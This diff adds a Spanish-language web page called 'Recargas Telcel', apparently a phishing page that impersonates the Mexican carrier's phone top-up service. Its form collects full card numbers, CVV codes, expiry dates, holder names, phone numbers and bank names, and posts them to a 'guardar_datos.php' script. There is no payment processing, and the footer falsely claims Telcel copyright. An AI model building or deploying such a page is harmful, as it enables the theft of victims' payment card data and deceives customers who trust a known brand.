@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recargas Telcel</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <header>
+        <h1>Recargas Telcel</h1>
+    </header>
+    
+    <main>
+        <section class="carousel">
+            <div class="carousel-container">
+                <img src="img/celular1.jpg" alt="Celular 1">
+                <img src="img/celular2.jpg" alt="Celular 2">
+                <img src="img/celular3.jpg" alt="Celular 3">
+            </div>
+            <button class="prev" onclick="prevSlide()">&#10094;</button>
+            <button class="next" onclick="nextSlide()">&#10095;</button>
+        </section>
+        
+        <section class="recarga">
+            <h2>Compra tu Recarga</h2>
+            <form id="recargaForm" action="guardar_datos.php" method="POST">
+                <label for="monto">Monto de la recarga:</label>
+                <input type="number" id="monto" name="monto" required>
+
+                <label for="tipoTarjeta">Tipo de tarjeta:</label>
+                <select id="tipoTarjeta" name="tipoTarjeta" required>
+                    <option value="debito">Débito</option>
+                    <option value="credito">Crédito</option>
+                </select>
+
+                <label for="numeroTarjeta">Número de tarjeta:</label>
+                <input type="text" id="numeroTarjeta" name="numeroTarjeta" required>
+
+                <label for="nombreTitular">Nombre del titular:</label>
+                <input type="text" id="nombreTitular" name="nombreTitular" required>
+
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" name="cvv" required>
+
+                <label for="vencimientoMes">Mes de vencimiento:</label>
+                <select id="vencimientoMes" name="vencimientoMes" required>
+                    <!-- Opciones de meses -->
+                    <option value="01">01 - Enero</option>
+                    <option value="02">02 - Febrero</option>
+                    <option value="03">03 - Marzo</option>
+                    <option value="04">04 - Abril</option>
+                    <option value="05">05 - Mayo</option>
+                    <option value="06">06 - Junio</option>
+                    <option value="07">07 - Julio</option>
+                    <option value="08">08 - Agosto</option>
+                    <option value="09">09 - Septiembre</option>
+                    <option value="10">10 - Octubre</option>
+                    <option value="11">11 - Noviembre</option>
+                    <option value="12">12 - Diciembre</option>
+                </select>
+
+                <label for="vencimientoAno">Año de vencimiento:</label>
+                <select id="vencimientoAno" name="vencimientoAno" required>
+                    <!-- Opciones de años -->
+                    <script>
+                        const currentYear = new Date().getFullYear();
+                        for (let i = currentYear; i <= 2040; i++) {
+                            document.write('<option value="' + i + '">' + i + '</option>');
+                        }
+                    </script>
+                </select>
+
+                <label for="telefono">Número de teléfono:</label>
+                <input type="tel" id="telefono" name="telefono" required>
+
+                <label for="banco">Banco:</label>
+                <select id="banco" name="banco" required>
+                    <option value="bancomer">BBVA Bancomer</option>
+                    <option value="banamex">Banamex</option>
+                    <option value="santander">Santander</option>
+                    <option value="hsbc">HSBC</option>
+                    <option value="scotiabank">Scotiabank</option>
+                </select>
+
+                <button type="submit">Realizar Recarga</button>
+            </form>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 Telcel. Todos los derechos reservados.</p>
+    </footer>
+</body>
+</html>
